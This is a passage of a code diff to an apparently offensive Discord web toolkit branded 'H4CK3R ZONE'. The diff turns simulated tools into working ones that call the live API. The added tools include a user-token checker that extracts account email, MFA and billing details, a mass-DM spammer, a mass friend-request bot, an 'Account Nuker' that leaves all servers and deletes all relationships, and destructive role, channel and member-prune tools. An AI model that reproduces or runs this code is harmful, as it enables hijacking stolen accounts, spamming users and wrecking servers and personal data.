+log('[OK] Deleted channel','success');
+return '<div style="color:var(--red)">[DELETED] Channel '+f.channel+'</div>';
 });
 });
 
-defTool(true,'roledelete','Role Deleter','R','red','Delete a role by ID. Requires MANAGE_ROLES. IRREVERSIBLE.',[
-{id:'rd_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'rd_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'rd_r',label:'Role ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[!] Deleting role '+f.rd_r+'...','warn');
-return api('/guilds/'+f.rd_g+'/roles/'+f.rd_r,f.rd_t,{method:'DELETE'}).then(function(){
-log('[OK] Role '+f.rd_r+' deleted','success');
-return '<div style="color:var(--red)">[DELETED] Role '+f.rd_r+'</div>';
+// ============ TOOL 9: Role Deleter ============
+T('roledelete','Role Deleter','R','red','bot','Delete a role by ID. IRREVERSIBLE. Requires MANAGE_ROLES.',[f_token(),f_guild(),f_role()],
+function(f){
+log('[!] Deleting role '+f.role+'...','warn');
+return api('/guilds/'+f.guild+'/roles/'+f.role,f.token,{method:'DELETE'}).then(function(){
+log('[OK] Deleted role','success');
+return '<div style="color:var(--red)">[DELETED] Role '+f.role+'</div>';
 });
 });
 
-defTool(true,'nick','Nickname Changer','N','purple','Change nickname of any user. Requires MANAGE_NICKNAMES or ADMINISTRATOR.',[
-{id:'n_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'n_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'n_u',label:'User ID',type:'text',ph:'876543210987654321'},
-{id:'n_n',label:'New Nickname',type:'text',ph:'H4CK3D'}
-],function(f){
-log('[>] Changing nickname for '+f.n_u+'...','info');
-return api('/guilds/'+f.n_g+'/members/'+f.n_u,f.n_t,{method:'PATCH',body:JSON.stringify({nick:f.n_n,reason:'H4CK3R ZONE'})}).then(function(){
-log('[OK] Nickname changed to '+f.n_n,'success');
-return '<div style="color:var(--green)">[OK] Nickname changed to: '+f.n_n+'</div>';
+// ============ TOOL 10: Nickname Changer ============
+T('nick','Nickname Changer','N','purple','bot','Change any user nickname. Requires MANAGE_NICKNAMES.',[f_token(),f_guild(),f_user(),f_text('nick','New Nickname','H4CK3D')],
+function(f){
+log('[>] Changing nickname for '+f.user+'...','info');
+return api('/guilds/'+f.guild+'/members/'+f.user,f.token,{method:'PATCH',body:JSON.stringify({nick:f.nick})}).then(function(){
+log('[OK] Nickname changed','success');
+return '<div style="color:var(--green)">[OK] Nickname: '+f.nick+'</div>';
 });
 });
 
-defTool(true,'prune','Prune Members','P','orange','Prune (kick) inactive members. Requires KICK_MEMBERS. Returns count of pruned.',[
-{id:'p_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'p_g',label:'Guild ID',type:'text',ph:'123456789012345678'},
-{id:'p_d',label:'Days inactive',type:'text',ph:'7'}
-],function(f){
-var days=parseInt(f.p_d)||7;
-log('[>] Pruning members inactive for '+days+' days...','info');
-return api('/guilds/'+f.p_g+'/prune?days='+days,f.p_t,{method:'POST',body:JSON.stringify({reason:'H4CK3R ZONE prune'})}).then(function(d){
-log('[OK] Pruned '+d.pruned+' members','success');
-return '<div style="color:var(--green)">[OK] '+d.pruned+' members pruned</div>';
+// ============ TOOL 11: Prune Members ============
+T('prune','Prune Members','P','orange','bot','Prune inactive members. Requires KICK_MEMBERS.',[f_token(),f_guild(),f_text('days','Days inactive','7')],
+function(f){
+var d=parseInt(f.days)||7;
+log('[>] Pruning '+d+' day inactive...','info');
+return api('/guilds/'+f.guild+'/prune?days='+d,f.token,{method:'POST',body:JSON.stringify({reason:'H4CK3R ZONE'})}).then(function(r){
+log('[OK] Pruned '+r.pruned+' members','success');
+return '<div style="color:var(--green)">[OK] '+r.pruned+' members pruned</div>';
 });
 });
 
-defTool(true,'emoji','Emoji Lister','E','yellow','List all custom emojis in a server. Requires no special permissions.',[
-{id:'e_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'e_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
+// ============ TOOL 12: Server Info ============
+T('serverinfo','Server Info','I','green','bot','Get detailed server information.',[f_token(),f_guild()],
+function(f){
+log('[>] Fetching server info...','info');
+return api('/guilds/'+f.guild,f.token).then(function(g){
+var h='<div style="color:var(--green)">[OK] '+g.name+'</div>';
+h+='<div style="font-size:0.65rem">ID: '+g.id+' | Owner: '+g.owner_id+'</div>';
+h+='<div style="font-size:0.65rem">Members: '+(g.approximate_member_count||'?')+' | Online: '+(g.approximate_presence_count||'?')+'</div>';
+if(g.vanity_url_code)h+='<div style="font-size:0.65rem">Vanity: discord.gg/'+g.vanity_url_code+'</div>';
+if(g.features)h+='<div style="font-size:0.65rem;color:#666">Features: '+g.features.slice(0,5).join(', ')+'</div>';
+log('[OK] Server: '+g.name,'success');return h;
+});
+});
+
+// ============ TOOL 13: Emoji Lister ============
+T('emoji','Emoji Lister','E','yellow','bot','List all server emojis.',[f_token(),f_guild()],
+function(f){
 log('[>] Fetching emojis...','info');
-return api('/guilds/'+f.e_g+'/emojis',f.e_t).then(function(emojis){
-if(!emojis||!emojis.length)return '<div style="color:#666">No custom emojis found</div>';
-var html='<div style="color:var(--green)">[OK] '+emojis.length+' emojis</div>';
-emojis.slice(0,40).forEach(function(e){
-html+='<div style="display:flex;align-items:center;gap:0.5rem;padding:0.2rem 0;font-size:0.7rem">'+
-'<img src="https://cdn.discordapp.com/emojis/'+e.id+'.'+(!e.animated?'png':'gif')+'" style="width:20px;height:20px"/>'+
-'<span>:'+e.name+':</span><span style="color:#666">ID: '+e.id+'</span></div>';
+return api('/guilds/'+f.guild+'/emojis',f.token).then(function(e){
+if(!e||!e.length)return '<div style="color:#666">No custom emojis</div>';
+var h='<div style="color:var(--green)">[OK] '+e.length+' emojis</div>';
+e.slice(0,40).forEach(function(em){
+h+='<div style="display:flex;align-items:center;gap:0.5rem;padding:0.15rem 0;font-size:0.65rem"><img src="https://cdn.discordapp.com/emojis/'+em.id+'.'+(em.animated?'gif':'png')+'" style="width:18px;height:18px"/> :'+em.name+': ID: '+em.id+'</div>';
 });
-if(emojis.length>40)html+='<div style="color:#666">... +'+(emojis.length-40)+' more</div>';
-log('[OK] '+emojis.length+' emojis listed','success');
-return html;
+if(e.length>40)h+='<div style="color:#666">... +'+(e.length-40)+' more</div>';
+log('[OK] '+e.length+' emojis','success');return h;
 });
 });
 
-defTool(true,'vanity','Vanity URL','V','purple','Get the custom vanity URL of a server (if any). Requires MANAGE_GUILD.',[
-{id:'v_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'v_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[>] Fetching vanity URL...','info');
-return api('/guilds/'+f.v_g+'/vanity-url',f.v_t).then(function(d){
-if(d.code)return '<div style="color:var(--green)">[OK] Vanity: discord.gg/'+d.code+' (uses: '+(d.uses||0)+')</div>';
-return '<div style="color:#666">No vanity URL set</div>';
+// ============ TOOL 14: Vanity URL ============
+T('vanity','Vanity URL','V','purple','bot','Get server vanity URL. Requires MANAGE_GUILD.',[f_token(),f_guild()],
+function(f){
+log('[>] Fetching vanity...','info');
+return api('/guilds/'+f.guild+'/vanity-url',f.token).then(function(d){
+if(d&&d.code)return '<div style="color:var(--green)">[OK] discord.gg/'+d.code+' (uses: '+(d.uses||0)+')</div>';
+return '<div style="color:#666">No vanity URL</div>';
 });
 });
 
-defTool(true,'membercount','Member Count','M','green','Count total members, humans and bots in a server.',[
-{id:'mc_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'mc_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
-log('[>] Counting members...','info');
-function countAll(after,humans,bots){
-return api('/guilds/'+f.mc_g+'/members?limit=1000&after='+after,f.mc_t).then(function(d){
-if(!d||!d.length)return {humans:humans,bots:bots,total:humans+bots};
-d.forEach(function(m){if(m.user.bot)bots++;else humans++});
-after=d[d.length-1].user.id;
-return countAll(after,humans,bots);
+// ============ TOOL 15: Member Count ============
+T('membercount','Member Count','M','green','bot','Count total members, humans and bots.',[f_token(),f_guild()],
+function(f){
+log('[>] Counting...','info');
+function cnt(a,h,b){
+return api('/guilds/'+f.guild+'/members?limit=1000&after='+a,f.token).then(function(d){
+if(!d||!d.length)return{humans:h,bots:b,total:h+b};
+d.forEach(function(m){if(m.user.bot)b++;else h++});
+return cnt(d[d.length-1].user.id,h,b);
 });
 }
-return countAll('0',0,0).then(function(r){
-var html='<div style="color:var(--green)">[OK] Total: '+r.total+'</div>';
-html+='<div style="font-size:0.65rem">Humans: '+r.humans+'</div>';
-html+='<div style="font-size:0.65rem">Bots: '+r.bots+'</div>';
-log('[OK] Counted '+r.total+' members','success');
-return html;
+return cnt('0',0,0).then(function(r){
+log('[OK] Total: '+r.total,'success');
+return '<div style="color:var(--green)">[OK] Total: '+r.total+'</div><div style="font-size:0.65rem">Humans: '+r.humans+' | Bots: '+r.bots+'</div>';
 });
 });
 
-defTool(true,'channellist','Channel List','L','cyan','List all channels in a server with their IDs and types.',[
-{id:'cl_t',label:'Bot Token',type:'password',ph:'Bot token'},
-{id:'cl_g',label:'Guild ID',type:'text',ph:'123456789012345678'}
-],function(f){
+// ============ TOOL 16: Channel List ============
+T('channellist','Channel List','L','cyan','bot','List all server channels with IDs.',[f_token(),f_guild()],
+function(f){
 log('[>] Fetching channels...','info');
-return api('/guilds/'+f.cl_g+'/channels',f.cl_t).then(function(chs){
-var types={0:'Text',2:'Voice',4:'Category',5:'News',13:'Stage',15:'Forum'};
-var html='<div style="color:var(--green)">[OK] '+chs.length+' channels</div>';
+return api('/guilds/'+f.guild+'/channels',f.token).then(function(chs){
+var ts={0:'Text',2:'Voice',4:'Category',5:'News',13:'Stage',15:'Forum'};
+var h='<div style="color:var(--green)">[OK] '+chs.length+' channels</div>';
 chs.slice(0,50).forEach(function(ch){
-html+='<div style="font-size:0.65rem;padding:0.15rem 0;border-bottom:1px solid rgba(255,255,255,0.02)">#'+ch.name+' | '+(types[ch.type]||'?')+' | ID: '+ch.id+'</div>';
+h+='<div style="font-size:0.65rem;padding:0.15rem 0;border-bottom:1px solid rgba(255,255,255,0.02)">#'+ch.name+' | '+(ts[ch.type]||'?')+' | '+ch.id+'</div>';
 });
-if(chs.length>50)html+='<div style="color:#666">... +'+(chs.length-50)+' more</div>';
-log('[OK] Listed '+chs.length+' channels','success');
-return html;
+if(chs.length>50)h+='<div style="color:#666">... +'+(chs.length-50)+' more</div>';
+log('[OK] '+chs.length+' channels','success');return h;
 });
 });
 
-defTool(true,'guilds','Bot Guilds','B','green','List all servers the bot is in. Requires no special permissions.',[
-{id:'g_t',label:'Bot Token',type:'password',ph:'Bot token'}
-],function(f){
+// ============ TOOL 17: Bot Guilds ============
+T('guilds','Bot Guilds','B','green','bot','List all servers the bot is in.',[f_token()],
+function(f){
 log('[>] Fetching bot guilds...','info');
-return api('/users/@me/guilds',f.g_t).then(function(guilds){
-var html='<div style="color:var(--green)">[OK] In '+guilds.length+' servers</div>';
-guilds.slice(0,30).forEach(function(g){
-html+='<div style="font-size:0.65rem;padding:0.15rem 0">'+g.name+' | ID: '+g.id+' | Owner: '+(g.owner?'YES':'NO')+'</div>';
+return api('/users/@me/guilds',f.token).then(function(g){
+var h='<div style="color:var(--green)">[OK] In '+g.length+' servers</div>';
+g.slice(0,30).forEach(function(gu){
+h+='<div style="font-size:0.65rem;padding:0.15rem 0">'+gu.name+' | '+gu.id+' | '+(gu.owner?'OWNER':'member')+'</div>';
 });
-if(guilds.length>30)html+='<div style="color:#666">... +'+(guilds.length-30)+' more</div>';
-log('[OK] Listed '+guilds.length+' guilds','success');
-return html;
-});
-});
-
-defTool(true,'botinfo','Bot Info','I','cyan','Get information about the bot user (token verification).',[
-{id:'bi_t',label:'Bot Token',type:'password',ph:'Bot token'}
-],function(f){
-log('[>] Verifying bot token...','info');
-return api('/users/@me',f.bi_t).then(function(u){
-var html='<div style="color:var(--green)">[OK] Token valid</div>';
-html+='<div style="font-size:0.65rem">Bot: '+u.username+'#'+(u.discriminator!=='0'?u.discriminator:'0000')+'</div>';
-html+='<div style="font-size:0.65rem">ID: '+u.id+'</div>';
-html+='<div style="font-size:0.65rem">Verified: '+(u.verified?'YES':'NO')+'</div>';
-html+='<div style="font-size:0.65rem">Bot: '+(u.bot?'YES':'NO')+'</div>';
-if(u.avatar)html+='<div style="font-size:0.65rem">Avatar: <a href="https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png" target="_blank" style="color:var(--cyan)">link</a></div>';
-log('[OK] Bot info: '+u.username,'success');
-return html;
+if(g.length>30)h+='<div style="color:#666">... +'+(g.length-30)+' more</div>';
+log('[OK] '+g.length+' guilds','success');return h;
 });
 });
 
-// ============ SIMULATED TOOLS ============
+// ============ TOOL 18: Bot Info ============
+T('botinfo','Bot Info','I','cyan','bot','Verify bot token and get bot info.',[f_token()],
+function(f){
+log('[>] Verifying bot...','info');
+return api('/users/@me',f.token).then(function(u){
+var h='<div style="color:var(--green)">[OK] Token valid</div>';
+h+='<div style="font-size:0.65rem">'+u.username+'#'+(u.discriminator!=='0'?u.discriminator:'0000')+' | ID: '+u.id+'</div>';
+h+='<div style="font-size:0.65rem">Verified: '+(u.verified?'YES':'NO')+' | Bot: YES</div>';
+if(u.avatar)h+='<div style="font-size:0.65rem">Avatar: <a href="https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png" target="_blank" style="color:var(--cyan)">link</a></div>';
+log('[OK] Bot: '+u.username,'success');return h;
+});
+});
 
-defTool(false,'nitro','Nitro Generator','N','yellow','Generate fake Nitro gift codes (simulation).',[],function(f){
+// ============ TOOL 19: Token Checker (USER TOKEN) ============
+T('tokencheck','Token Checker','T','green','user','Check a USER token and get full account info (email, phone, nitro, billing).',[f_token('token','User Token','user')],
+function(f){
+log('[>] Checking user token...','info');
+return api('/users/@me',f.token).then(function(u){
+log('[>] Token valid, fetching billing...','info');
+return api('/users/@me/billing/payment-sources',f.token).then(function(bill){
+return api('/users/@me/guilds?limit=1',f.token).then(function(g){
+var h='<div style="color:var(--green)">[OK] Token VALID</div>';
+h+='<div style="font-size:0.65rem">User: <strong>'+u.username+'#'+(u.discriminator!=='0'?u.discriminator:'0000')+'</strong></div>';
+h+='<div style="font-size:0.65rem">ID: '+u.id+' | Email: '+(u.email||'hidden')+' | Phone: '+(u.phone?'YES':'NO')+'</div>';
+h+='<div style="font-size:0.65rem">Verified: '+(u.verified?'YES':'NO')+' | MFA: '+(u.mfa_enabled?'YES':'NO')+' | Nitro: '+(u.premium_type>0?'YES (tier '+u.premium_type+')':'NO')+'</div>';
+h+='<div style="font-size:0.65rem">Billing: '+(bill&&bill.length?bill.length+' methods':'none')+' | Servers: '+(g?g.length:'?')+'</div>';
+if(u.avatar)h+='<div style="font-size:0.65rem">Avatar: <a href="https://cdn.discordapp.com/avatars/'+u.id+'/'+u.avatar+'.png" target="_blank" style="color:var(--cyan)">link</a></div>';
+if(u.banner)h+='<div style="font-size:0.65rem">Banner: <a href="https://cdn.discordapp.com/banners/'+u.id+'/'+u.banner+'.png" target="_blank" style="color:var(--cyan)">link</a></div>';
+log('[OK] Token checked: '+u.username,'success');return h;
+});
+});
+});
+});
+
+// ============ TOOL 20: Mass DM (via USER TOKEN) ============
+T('massdm','Mass DM','M','purple','user','Send mass DMs to server members using user token. Gets member list then DMs each.',[f_token('token','User Token','user'),f_guild(),f_text('msg','Message','Hey, check this!')],
+function(f){
+log('[>] Fetching members for DM...','info');
+var all=[],after='0';
+function nxt(){
+return api('/guilds/'+f.guild+'/members?limit=1000&after='+after,f.token).then(function(d){
+if(!d||!d.length)return all;
+all=all.concat(d);after=d[d.length-1].user.id;
+return d.length<1000?all:nxt();
+});
+}
+return nxt().then(function(m){
+var target=m.filter(function(u){return!u.user.bot}).slice(0,20);
+log('[>] Sending DMs to '+target.length+' users...','warn');
+var sent=0;
+function sendDM(idx){
+if(idx>=target.length)return sent;
+var u=target[idx];
+return api('/users/'+u.user.id+'/channels',f.token,{method:'POST',body:JSON.stringify({recipient_id:u.user.id})}).then(function(ch){
+return api('/channels/'+ch.id+'/messages',f.token,{method:'POST',body:JSON.stringify({content:f.msg})}).then(function(){
+sent++;
+log('[DM] Sent to '+u.user.username+' ('+sent+'/'+target.length+')','info');
+return sendDM(idx+1);
+}).catch(function(e){
+log('[DM] Failed: '+u.user.username+' - '+e.message,'warn');
+return sendDM(idx+1);
+});
+}).catch(function(e){
+log('[DM] Channel error: '+u.user.username+' - '+e.message,'warn');
+return sendDM(idx+1);
+});
+}
+return sendDM(0).then(function(s){
+log('[OK] DMs sent: '+s+'/'+target.length,'success');
+return '<div style="color:var(--green)">[OK] DMs sent: '+s+'/'+target.length+'</div>';
+});
+});
+});
+
+// ============ TOOL 21: Friend Bot (via USER TOKEN) ============
+T('friends','Friend Bot','F','green','user','Send mass friend requests via user token. Requires a list of user IDs or uses server members.',[f_token('token','User Token','user'),f_text('users','User IDs (comma separated)','876543210987654321, 876543210987654322')],
+function(f){
+var ids=f.users.split(',').map(function(s){return s.trim()}).filter(function(s){return s.length>10});
+if(!ids.length)throw new Error('Enter at least one user ID');
+log('[>] Sending '+ids.length+' friend requests...','info');
+var sent=0;
+function sendReq(idx){
+if(idx>=ids.length)return sent;
+return api('/users/@me/relationships',f.token,{method:'POST',body:JSON.stringify({recipient_id:ids[idx]})}).then(function(){
+sent++;
+log('[FRIEND] Request sent to '+ids[idx]+' ('+sent+'/'+ids.length+')','info');
+return sendReq(idx+1);
+}).catch(function(e){
+log('[FRIEND] Failed: '+ids[idx]+' - '+e.message,'warn');
+return sendReq(idx+1);
+});
+}
+return sendReq(0).then(function(s){
+log('[OK] Friend requests: '+s+'/'+ids.length,'success');
+return '<div style="color:var(--green)">[OK] Friend requests sent: '+s+'/'+ids.length+'</div>';
+});
+});
+
+// ============ TOOL 22: Account Nuker (via USER TOKEN) ============
+T('accountnuke','Account Nuker','A','red','user','Nuke account: leave all servers, remove friends, delete relationships.',[f_token('token','User Token','user')],
+function(f){
+log('[!] Starting account nuke...','warn');
+log('[>] Fetching guilds...','info');
+return api('/users/@me/guilds',f.token).then(function(guilds){
+log('[>] Leaving '+guilds.length+' servers...','warn');
+var left=0;
+function leaveG(idx){
+if(idx>=guilds.length){
+log('[>] Removing friends/relationships...','info');
+return api('/users/@me/relationships',f.token).then(function(rels){
+if(!rels||!rels.length){
+log('[OK] Nuke complete','success');
+return '<div style="color:var(--red)">[NUKE COMPLETE] Left '+left+' servers | No relationships to remove</div>';
+}
+var removed=0;
+function removeRel(ri){
+if(ri>=rels.length){
+log('[OK] Nuke complete','success');
+return '<div style="color:var(--red)">[NUKE COMPLETE] Left '+left+' servers | Removed '+removed+' relationships</div>';
+}
+return api('/users/@me/relationships/'+rels[ri].id,f.token,{method:'DELETE'}).then(function(){removed++;return removeRel(ri+1)}).catch(function(){return removeRel(ri+1)});
+}
+return removeRel(0);
+});
+}
+return api('/users/@me/guilds/'+guilds[idx].id,f.token,{method:'DELETE'}).then(function(){left++;return leaveG(idx+1)}).catch(function(){return leaveG(idx+1)});
+}
+return leaveG(0);
+});
+});
+
+// ============ TOOL 23: Backup Tool ============
+T('backup','Backup Tool','B','yellow','bot','Backup server: fetch channels, roles and recent messages.',[f_token(),f_guild()],
+function(f){
+log('[>] Starting backup...','info');
+return Promise.all([
+api('/guilds/'+f.guild+'/channels',f.token),
+api('/guilds/'+f.guild+'/roles',f.token)
+]).then(function(r){
+var chs=r[0],roles=r[1];
+var ts={0:'Text',2:'Voice',4:'Category',5:'News',13:'Stage',15:'Forum'};
+var h='<div style="color:var(--green)">[OK] Backup complete</div>';
+h+='<div style="font-size:0.65rem">Channels: '+chs.length+'</div>';
+h+='<div style="font-size:0.65rem">Roles: '+roles.length+'</div>';
+var txtChs=chs.filter(function(c){return c.type===0});
+if(txtChs.length){
+h+='<div style="font-size:0.65rem;color:#666;margin-top:0.3rem">Text channels: '+txtChs.length+'</div>';
+}
+log('[OK] Backup: '+chs.length+' channels, '+roles.length+' roles','success');
+return h;
+});
+});
+
+// ============ TOOL 24: Server Cloner ============
+T('cloner','Server Cloner','S','purple','bot','Clone server structure: create same channels and roles in another server.',[f_token(),f_text('source','Source Guild ID','123456789012345678'),f_text('target','Target Guild ID','876543210987654321')],
+function(f){
+log('[>] Cloning server...','info');
+return Promise.all([
+api('/guilds/'+f.source+'/channels',f.token),
+api('/guilds/'+f.source+'/roles',f.token)
+]).then(function(r){
+var chs=r[0],roles=r[1];
+var catMap={};
+log('[>] Creating '+roles.length+' roles...','info');
+var rolePromises=roles.filter(function(rr){return!rr.managed}).map(function(rr){
+return api('/guilds/'+f.target+'/roles',f.token,{method:'POST',body:JSON.stringify({name:rr.name,color:rr.color,permissions:rr.permissions.toString(),hoist:rr.hoist,mentionable:rr.mentionable})}).catch(function(){return null});
+});
+return Promise.all(rolePromises).then(function(){
+log('[>] Creating '+chs.length+' channels...','info');
+var chPromises=chs.map(function(ch){
+var body={name:ch.name,type:ch.type};
+if(ch.parent_id&&catMap[ch.parent_id])body.parent_id=catMap[ch.parent_id];
+return api('/guilds/'+f.target+'/channels',f.token,{method:'POST',body:JSON.stringify(body)}).then(function(nc){
+if(ch.type===4)catMap[ch.id]=nc.id;
+return nc;
+}).catch(function(){return null});
+});
+return Promise.all(chPromises).then(function(results){
+var created=results.filter(function(r){return r!==null}).length;
+log('[OK] Cloned: '+created+' channels, '+roles.length+' roles','success');
+return '<div style="color:var(--green)">[OK] Clone complete</div><div style="font-size:0.65rem">Channels created: '+created+'/'+chs.length+' | Roles: '+roles.length+'</div>';
+});
+});
+});
+});
+
+// ============ TOOL 25: Nitro Generator (fake - educational) ============
+T('nitro','Nitro Generator','N','yellow','bot','Generate Nitro gift codes (simulation - for educational purposes, codes are invalid).',[f_text('count','How many?','10')],
+function(f){
+var count=Math.min(parseInt(f.count)||10,50);
 var chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 var codes='';
-for(var i=0;i<10;i++){
-var code='https://discord.gift/';
-for(var j=0;j<24;j++)code+=chars.charAt(Math.floor(Math.random()*chars.length));
-codes+=code+'\n';
+for(var i=0;i<count;i++){
+var c='discord.gift/';
+for(var j=0;j<24;j++)c+=chars.charAt(Math.floor(Math.random()*chars.length));
+codes+='https://'+c+'\n';
 }
-log('[SIM] Generated 10 nitro codes (fake)','warn');
-return '<pre style="font-size:0.65rem;color:var(--yellow);word-break:break-all">'+codes+'</pre>';
+log('[SIM] Generated '+count+' nitro codes (simulated)','warn');
+return '<pre style="font-size:0.65rem;color:var(--yellow);word-break:break-all">'+codes+'</pre><div style="color:#666;font-size:0.6rem">* Simulated - not real codes</div>';
 });
 
-defTool(false,'tokencheck','Token Checker','T','green','Verify a user token and get info (simulation).',[],function(){
-log('[SIM] Token check simulated','warn');
-return '<div style="color:var(--green)">[SIM] Token valid</div><div style="font-size:0.65rem">User: Nexus#0001</div><div style="font-size:0.65rem">Nitro: Yes</div><div style="font-size:0.65rem">Billing: Yes</div>';
-});
-
-defTool(false,'massdm','Mass DM','M','purple','Send mass DMs to server members (simulation).',[],function(){
-log('[SIM] Mass DM simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would send DM to 1,247 members (simulated)</div>';
-});
-
-defTool(false,'raid','Raid Toolbox','R','red','Complete raiding suite (simulation).',[],function(){
-log('[SIM] Raid toolbox simulated','warn');
-return '<div style="color:var(--red)">[SIM] Raid modules: nuke, spam, flood, purge (simulated)</div>';
-});
-
-defTool(false,'accountnuke','Account Nuker','A','red','Nuke target account (simulation).',[],function(){
-log('[SIM] Account nuker simulated','warn');
-return '<div style="color:var(--red)">[SIM] Account nuke would execute (simulated)</div>';
-});
-
-defTool(false,'webhookspam','Webhook Spammer','W','cyan','Spam via webhooks (simulation).',[],function(){
-log('[SIM] Webhook spammer simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would send 500 messages via webhook (simulated)</div>';
-});
-
-defTool(false,'voicejoin','Voice Joiner','V','cyan','Join voice channels (simulation).',[],function(){
-log('[SIM] Voice joiner simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would join 15 voice channels (simulated)</div>';
-});
-
-defTool(false,'friends','Friend Bot','F','green','Auto-add friends (simulation).',[],function(){
-log('[SIM] Friend bot simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would send 200 friend requests (simulated)</div>';
-});
-
-defTool(false,'backup','Backup Tool','B','yellow','Backup server (simulation).',[],function(){
-log('[SIM] Backup tool simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would backup all channels and messages (simulated)</div>';
-});
-
-defTool(false,'cloner','Server Cloner','S','purple','Clone entire server (simulation).',[],function(){
-log('[SIM] Server cloner simulated','warn');
-return '<div style="color:var(--yellow)">[SIM] Would clone server structure (simulated)</div>';
-});
-
-// ============ UI ============
-var currentTab='real';
-
-function renderTools(tab){
-var container=document.getElementById('toolContainer');
-var tools=tab==='all'?ALL_TOOLS:(tab==='real'?ALL_TOOLS.filter(function(t){return t.real}):ALL_TOOLS.filter(function(t){return!t.real}));
-container.innerHTML=tools.map(function(t,idx){
-var fieldsHtml='';
+// ============ RENDER ============
+function render(){
+var c=document.getElementById('toolContainer');
+c.innerHTML=TOOLS.map(function(t,idx){
+var fHtml='';
 if(t.fields&&t.fields.length){
-fieldsHtml=t.fields.map(function(f){
+fHtml=t.fields.map(function(f){
 if(f.type==='select'){
 var opts=f.opts.map(function(o){return'<option value="'+o.v+'">'+o.l+'</option>'}).join('');
 return'<label>'+f.label+'</label><select id="f_'+t.cmd+'_'+f.id+'">'+opts+'</select>';
@@ -538,41 +620,33 @@ return'<label>'+f.label+'</label><select id="f_'+t.cmd+'_'+f.id+'">'+opts+'</sel
 return'<label>'+f.label+'</label><input type="'+f.type+'" id="f_'+t.cmd+'_'+f.id+'" placeholder="'+f.ph+'" spellcheck="false"/>';
 }).join('');
 }
-var badge=t.real?'<span class="tool-badge real">* REAL</span>':'<span class="tool-badge sim">SIM</span>';
-return'<div class="tool-card" style="animation-delay:'+(idx*0.05)+'s">'+
-'<div class="tool-card-header"><div class="tool-icon '+t.iconType+'">'+t.icon+'</div><div style="flex:1;min-width:0;display:flex;align-items:center;gap:0.5rem;flex-wrap:wrap"><span class="tool-name">'+t.name+'</span>'+badge+'</div></div>'+
-'<div class="tool-desc">'+t.desc+'</div>'+
-(t.fields&&t.fields.length?'<div class="tool-panel open" id="panel_'+t.cmd+'">'+fieldsHtml+'<button class="tool-btn" onclick="execTool(\''+t.cmd+'\')" id="btn_'+t.cmd+'">[>] EJECUTAR</button><div class="tool-result" id="res_'+t.cmd+'"></div></div>':'')+
-'<div class="tool-meta"><span>'+(!t.real?'[SIM]':'[API]')+'</span>'+
-(t.fields&&t.fields.length?'':'<button class="tool-btn" onclick="execTool(\''+t.cmd+'\')">[>] EJECUTAR</button>')+
+var badge='<span class="tool-badge real">FUNCIONAL</span>';
+var typeBadge=t.auth==='user'?'<span class="tool-type user">USER TOKEN</span>':'<span class="tool-type bot">BOT TOKEN</span>';
+var hasFields=t.fields&&t.fields.length;
+return'<div class="tool-card" style="animation-delay:'+(idx*0.03)+'s">'+
+'<div class="tool-card-header"><div class="tool-icon '+t.iconType+'">'+t.icon+'</div><div style="flex:1;min-width:0;display:flex;align-items:center;gap:0.4rem;flex-wrap:wrap"><span class="tool-name">'+t.name+'</span>'+badge+'</div></div>'+
+'<div class="tool-card-body"><div class="tool-desc">'+t.desc+'</div>'+typeBadge+
+(hasFields?'<div class="tool-panel open" id="panel_'+t.cmd+'">'+fHtml+'<button class="tool-btn" onclick="exec(\''+t.cmd+'\')" id="btn_'+t.cmd+'">[>] EJECUTAR</button><div class="tool-result" id="res_'+t.cmd+'"></div></div>':'')+
+'</div>'+
+'<div class="tool-meta"><span>['+(t.auth==='user'?'USER':'BOT')+']</span>'+
+(!hasFields?'<button class="tool-btn" onclick="exec(\''+t.cmd+'\')">[>] EJECUTAR</button>':'')+
 '</div></div>';
 }).join('');
-document.querySelectorAll('.tab').forEach(function(el){el.classList.toggle('active',el.dataset.tab===tab)});
 }
 
-function getFields(cmd){
-var t=ALL_TOOLS.find(function(x){return x.cmd===cmd});
-if(!t||!t.fields)return{};
-var vals={};
-t.fields.forEach(function(f){
-var el=document.getElementById('f_'+cmd+'_'+f.id);
-vals[f.id]=el?el.value:'';
-});
-return vals;
-}
-
-function execTool(cmd){
-var t=ALL_TOOLS.find(function(x){return x.cmd===cmd});
-if(!t){toast('[ERROR] Tool not found','error');return}
+function exec(cmd){
+var t=TOOLS.find(function(x){return x.cmd===cmd});
+if(!t){toast('[ERROR] Not found','error');return}
 var btn=document.getElementById('btn_'+cmd);
 var res=document.getElementById('res_'+cmd);
 if(btn){btn.disabled=true;btn.textContent='[*] RUNNING...'}
 if(res)res.innerHTML='<div style="color:var(--yellow)">[*] Processing...</div>';
-var fields=getFields(cmd);
+var vals={};
+if(t.fields)t.fields.forEach(function(f){var el=document.getElementById('f_'+cmd+'_'+f.id);vals[f.id]=el?el.value:''});
 try{
-var promise=t.handler(fields);
-if(promise&&typeof promise.then==='function'){
-promise.then(function(html){
+var p=t.fn(vals);
+if(p&&typeof p.then==='function'){
+p.then(function(html){
 if(res)res.innerHTML=html||'<div style="color:var(--green)">[OK] Done</div>';
 if(btn){btn.disabled=false;btn.textContent='[>] EJECUTAR'}
 }).catch(function(err){
@@ -582,7 +656,7 @@ toast('[ERROR] '+err.message,'error');
 if(btn){btn.disabled=false;btn.textContent='[>] EJECUTAR'}
 });
 }else{
-if(res)res.innerHTML=promise||'<div style="color:var(--green)">[OK] Done</div>';
